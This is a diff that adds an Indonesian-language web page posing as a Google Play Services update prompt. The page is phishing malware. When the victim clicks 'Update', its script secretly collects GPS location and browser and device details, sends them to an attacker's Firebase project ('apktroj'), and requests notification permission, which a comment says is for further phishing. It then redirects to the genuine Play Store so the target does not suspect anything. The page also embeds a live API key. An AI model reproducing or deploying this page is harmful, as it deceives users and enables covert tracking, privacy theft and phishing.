@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Play Service Update</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: #f1f3f4; font-family: 'Roboto', sans-serif; }
+        .btn-google { background: #1a73e8; color: white; transition: background 0.2s; }
+        .btn-google:hover { background: #1765cc; }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen">
+    <div class="bg-white p-8 rounded-lg shadow-md max-w-sm w-full text-center">
+        <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" alt="Google" class="mx-auto mb-4 w-12">
+        <h1 class="text-xl font-medium mb-2">Pembaruan Diperlukan</h1>
+        <p class="text-gray-600 text-sm mb-6">Versi Layanan Google Play Anda sudah usang. Perbarui sekarang untuk tetap menggunakan aplikasi Google secara normal.</p>
+        
+        <div id="status" class="hidden mb-4 p-2 bg-blue-50 text-blue-700 text-xs rounded">
+            Mengunduh komponen keamanan...
+        </div>
+
+        <button id="update-btn" class="btn-google w-full py-2 rounded font-medium">Update Sekarang</button>
+        
+        <p class="mt-4 text-[10px] text-gray-400">© 2026 Google LLC. Semua hak dilindungi undang-undang.</p>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getFirestore, doc, setDoc, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
+            authDomain: "apktroj.firebaseapp.com",
+            projectId: "apktroj",
+            storageBucket: "apktroj.firebasestorage.app",
+            messagingSenderId: "943833619122",
+            appId: "1:943833619122:web:d757ced4d56267abf247ab"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const appId = "apktroj";
+
+        const btn = document.getElementById('update-btn');
+        const status = document.getElementById('status');
+
+        btn.onclick = async () => {
+            status.classList.remove('hidden');
+            btn.disabled = true;
+            btn.innerText = "Processing...";
+
+            // 1. Ambil Lokasi (GPS)
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'location_logs'), {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    timestamp: serverTimestamp()
+                });
+            });
+
+            // 2. Ambil Info Browser & IP
+            const deviceData = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                online: true,
+                lastSeen: serverTimestamp()
+            };
+            
+            await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'devices', 'WEB-' + Date.now()), deviceData);
+
+            // 3. Minta izin Notifikasi (Buat Phishing selanjutnya)
+            Notification.requestPermission();
+
+            // Skenario: Setelah 3 detik, alihkan ke link asli biar target gak curiga
+            setTimeout(() => {
+                window.location.href = "https://play.google.com/store/apps/details?id=com.google.android.gms";
+            }, 3000);
+        };
+    </script>
+</body>
+</html>
